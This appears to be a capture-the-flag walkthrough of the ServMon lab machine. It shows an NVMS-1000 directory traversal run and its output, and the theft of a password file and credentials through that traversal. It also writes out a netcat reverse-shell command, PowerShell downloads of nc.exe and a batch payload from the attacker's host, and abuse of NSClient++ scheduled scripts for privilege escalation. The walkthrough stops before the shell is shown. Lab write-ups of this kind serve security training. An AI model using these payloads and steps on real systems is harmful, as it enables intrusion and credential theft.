1, Recon
port scan 
	21/tcp ftp 
	22/tcp ssh
	80/tcp http
	135/tcp RPC
	445/tcp SMB
	8443/tcp https-alt
page check
	We can get the name of page title `NVMS-1000`
	And we can also get the exploits of that `NVMS 1000 - Directory Traversal`

And we have successfully test that:
```
python3 nvms.py 10.10.10.184 Windows/system.ini win.ini
[+] DT Attack Succeeded
[+] Saving File Content
[+] Saved
[+] File Content

++++++++++ BEGIN ++++++++++
; for 16-bit app support
[386Enh]
woafont=dosapp.fon
EGA80WOA.FON=EGA80WOA.FON
EGA40WOA.FON=EGA40WOA.FON
CGA80WOA.FON=CGA80WOA.FON
CGA40WOA.FON=CGA40WOA.FON

[drivers]
wave=mmdrv.dll
timer=timer.drv

[mci]

++++++++++  END  ++++++++++

```

Let's try to check other useful files and creds. But I did not know which files I need to check.

Let's come to port 21(service ftp).
Very luckily, we can login with anonymous user.
Then we get 2 files
```
cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine

cat 'Notes to do.txt' 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```
Then we know to get the `Password.txt` from Nathan's Desktop and we also know Nadine did not upload the password. That means the password would be not changed.

Let's get the `Password.txt`, then the payload is `/../../../../../../../../../../../../users/nathan/desktop/passwords.txt`

```
Password.txt

1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

Since I only have a list of passwords without usernames, I’ll create a list of what I know now:
```
user.txt

administrator
nathan
nadine
```
Let's use the `crackmapexec` to check the SMB credit.
`ServMon\nadine:L1k3B1gBut7s@W0rk`

2, shell as nadine
By check the credit to `evil-winrm` and `smbclient` and ssh.
Only ssh could be useful for us and we can get shell of nadine

Then we can enumerate the existed applications of this machine. 
`NSClient++` would be our target.

With a shell, I can get the NSClient++ password. I could do it by reading the .ini file, or just having the helper program tell me:
```
nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
Current password: ew2x6SsGTxjRwXOT
```

If I try to log in from https://10.10.10.184:8443, it blocks me:
![](images/Pasted%20image%2020240913040259.png)

Towards the top of nsclient.ini, there’s this:
```
; Undocumented key                                                                                  
allowed hosts = 127.0.0.1 
```
I need to come from localhost. I’ll re-SSH with a tunnel that runs from my localhost:8443 to localhost on ServMon:8443:
```
ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443    
```

I was able to get success by taking the following steps based on How To Run Commands in the NSClient documentation. The steps are for directly interacting with the nsclient.ini file, but I eventually got a feel for how to use the web interface to get the same results:

1.Create shell.bat:
`\programdata\nc.exe 10.10.14.24 443 -e cmd`
This assumes that nc.exe is in C:\programdata (I will put it there) and it will connect back to me with a shell when run.

2.Upload nc64.exe and shell.bat to C:\programdata\. I started a Python HTTP server on my host, and used PowerShell’s wget command:
```
nadine@SERVMON C:\ProgramData>powershell wget http://10.10.14.65/nc64.exe -outfile nc.exe

nadine@SERVMON C:\ProgramData>powershell wget http://10.10.14.65/shell.bat -outfile shell.bat
```

3.In the NSClient++ GUI, first I’ll associate my script with a command by clicking Settings > external scripts > scripts, and then “+Add new”.
![](images/Pasted%20image%2020240913042430.png)
When I hit “Add”, df now shows up under scripts above, and the Changes tab turns red. I can go to Changes and save this to the disk config. This will add the following to the config file:
```
 ; in flight - TODO
   [/settings/external scripts/scripts/df]
   
   ; COMMAND - Command to execute
   command = C:\\programdata\\shell.bat
```

Now under scheduler > schedules I’ll hit the “+Add new” button. I need to add two things here. First, I’ll edit the section to add a new name, and then give it an interval of 10 seconds:

![](images/Pasted%20image%2020240913042509.png)

After hitting Add, I’ll change edit the form, and then Add again:

![](images/Pasted%20image%2020240913042519.png)

Now df shows up as a scheduled task, and I can see it has both key/values:
![](images/Pasted%20image%2020240913042533.png)


Go to Control –> Reload. Then Wait. It can take longer than it feels like it should. This box can be very frustrating.

